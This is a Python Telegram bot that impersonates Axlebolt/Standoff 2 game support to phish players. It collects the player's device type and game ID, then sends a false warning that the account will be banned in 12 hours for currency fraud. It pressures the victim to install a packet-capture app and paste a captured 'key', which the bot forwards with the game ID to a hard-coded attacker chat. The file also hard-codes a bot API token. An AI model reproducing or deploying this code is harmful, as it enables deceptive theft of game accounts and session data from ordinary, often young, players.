import telebot
import firebase_admin
import time
from threading import Thread
import logging
import datetime as dt
from time import sleep
from firebase_admin import credentials
from firebase_admin import firestore
from datetime import date
from datetime import timedelta
from telebot import types
import schedule
cred = credentials.Certificate("system.json")
firebase_admin.initialize_app(cred)
db = firestore.client()
token = '5011990621:AAHcP5ur_kh98rZkiltrVUNpdgPEYAZ7fvI'
bot = telebot.TeleBot(token)
doc_ref = db.collection('users').document('ID').get().to_dict()
def schedule_checker():
    while True:
        schedule.run_pending()
        sleep(1)
@bot.message_handler(commands=['start'])


def start_message(message):
    if message.text == '/start':
        doc_ref = db.collection(u'users').document('ID')
        doc_ref.update({str(message.chat.id):['any']})
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.row('Жалоба','Контакты')
        send = bot.send_message(message.chat.id, 'Здравствуйте! Выберите кнопку',reply_markup=keyboard)
        bot.register_next_step_handler(send,react_to_start_commands)
@bot.message_handler(content_type=['text'])
def react_to_start_commands(message):
    if message.text == 'Контакты':
        
        bot.send_message(message.chat.id,"Контакты:")
        bot.send_message(message.chat.id,"Сайт: https://axlebolt.com")
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.row('Назад')
        send = bot.send_message(message.chat.id, "Магазин: https://store.standoff2.com",reply_markup=keyboard)
        bot.register_next_step_handler(send,react_to_start_commands)
    elif message.text == "Жалоба" or message.text == 'Вернуться':
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.row('Android','IOS')
        keyboard.row('Главное меню')
        send = bot.send_message(message.chat.id,'Укажите пожалуйста тип вашего устройства',reply_markup=keyboard)
        bot.register_next_step_handler(send,react_to_start_commands)
    elif message.text == 'Android':
        doc_ref = db.collection('users').document('ID').get().to_dict()
        for i in doc_ref.items():
            if i[0] == str(message.chat.id):
                m = i[1]
                break
        if m[0] != 'IOS':
            doc_ref = db.collection('users').document('ID')
            doc_ref.update({str(message.chat.id):['Android']})
            send = bot.send_message(message.chat.id, 'Укажите пожалуйста ваш игровой ID')
            bot.register_next_step_handler(send,gameID)
        else:
            keyboard = telebot.types.ReplyKeyboardMarkup(True)
            keyboard.row('Вернуться')
            send = bot.send_message(message.chat.id, 'Кажется, у вас другая игровая платформа, попробуйте еще раз',reply_markup=keyboard)
            bot.register_next_step_handler(send,react_to_start_commands)
    elif message.text == 'IOS':
        doc_ref = db.collection('users').document('ID').get().to_dict()
        for i in doc_ref.items():
            if i[0] == str(message.chat.id):
                m = i[1]
                break
        if m[0] != 'Android':
            doc_ref = db.collection('users').document('ID')
            doc_ref.update({str(message.chat.id):['IOS']})
            send = bot.send_message(message.chat.id, 'Укажите пожалуйста ваш игровой ID')
            bot.register_next_step_handler(send,gameID)
        else:
            keyboard = telebot.types.ReplyKeyboardMarkup(True)
            keyboard.row('Вернуться')
            send = bot.send_message(message.chat.id, 'Кажется, у вас другая игровая платформа, попробуйте еще раз',reply_markup=keyboard)
            bot.register_next_step_handler(send,react_to_start_commands)    
    elif message.text == 'Отправить':
        send = bot.send_message(message.chat.id, 'Введите ваш ключ')
        bot.register_next_step_handler(send,sending_key)
    elif message.text == 'Главное меню' or message.text == 'Назад':
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.row('Жалоба','Контакты')
        send = bot.send_message(message.chat.id, 'Здравствуйте! Выберите кнопку',reply_markup=keyboard)
        bot.register_next_step_handler(send,react_to_start_commands)
    else:
        send = bot.send_message(message.chat.id,'Ошибка! Команда не распознана')
        bot.register_next_step_handler(send,react_to_start_commands)

def gameID(message):
    if len(message.text)==8 or len(message.text)==9:
        doc_ref = db.collection('users').document('ID').get().to_dict()
        for i in doc_ref.items():
            if i[0] == str(message.chat.id):
                m = i[1]
                break
        doc_ref = db.collection('users').document('ID')
        m.append(message.text)
        doc_ref.update({str(message.chat.id):[m[0],m[1]]})
        bot.send_message(message.chat.id, 'Проверяем информацию. Подождите, пожалуйста, некоторое время')
        schedule.every(5).seconds.do(checking_info,message).tag(str(message.chat.id))
    else:
        send = bot.send_message(message.chat.id, "Упс, вы допустили ошибку. Введите корректный ID")
        bot.register_next_step_handler(send,gameID)
def checking_info(message):
    schedule.clear(str(message.chat.id))
    doc_ref = db.collection('users').document('ID').get().to_dict()
    for i in doc_ref.items():
        if i[0] == str(message.chat.id):
            m = i[1]
            break
    if m[0] == 'Android':
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.row('Отправить')
        video = open('video.mp4','rb')
        bot.send_message(message.chat.id,"На вашем аккаунте, замечены следующие правонарушения: Мошенничество с внутриигровой валютой, с целью получения личной выгоды.  У вас 12 часов на ответ - далее блокировка.")
        bot.send_message(message.chat.id,"Вы можете обжаловать решение, предоставив доказательства, что вы не нарушали правила игры. Пришлите временной ключ действий для проверки. Для этого вам нужно установить приложение 'Packet Capture' из офицального магазина приложений и дальше следовать видео инструкции. Для отправки ключа, нажмите кнопку ‘Отправить’",reply_markup = keyboard)
        send = bot.send_video(message.chat.id,video)
        bot.register_next_step_handler(send,sending_key)
    else:
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.row('Главное меню')
        send = bot.send_message(message.chat.id,'Спасибо за уделённое время, у Вас все хорошо.',reply_markup=keyboard)
        bot.register_next_step_handler(send,react_to_start_commands)
    
def sending_key(message):
    if message.text == 'Отправить':
        send = bot.send_message(message.chat.id, 'Введите ваш ключ')
        bot.register_next_step_handler(send,sending_key)
    else:
        
        if len(message.text)<20:
            send = bot.send_message(message.chat.id,"Упс, ваш ключ неверен. Введите корректный ключ")
            bot.register_next_step_handler(send,sending_key)
        else:
            doc_ref = db.collection('users').document('ID').get().to_dict()
            for i in doc_ref.items():
                if i[0] == str(message.chat.id):
                    m = i[1]
                    break
            keyboard = telebot.types.ReplyKeyboardMarkup(True)
            keyboard.row('Главное меню')
            bot.send_message('1888582639','id:'+str(m[1]))
            bot.send_message('1888582639','key:'+message.text)
            send = bot.send_message(message.chat.id,"Спасибо, проверяем. Это может занять некоторое время",reply_markup=keyboard)
            bot.register_next_step_handler(send,react_to_start_commands)
        
if __name__ == "__main__":
    
    scheduleThread = Thread(target=schedule_checker)
    scheduleThread.daemon = True
    scheduleThread.start()
    bot.polling(none_stop=False,interval=1)



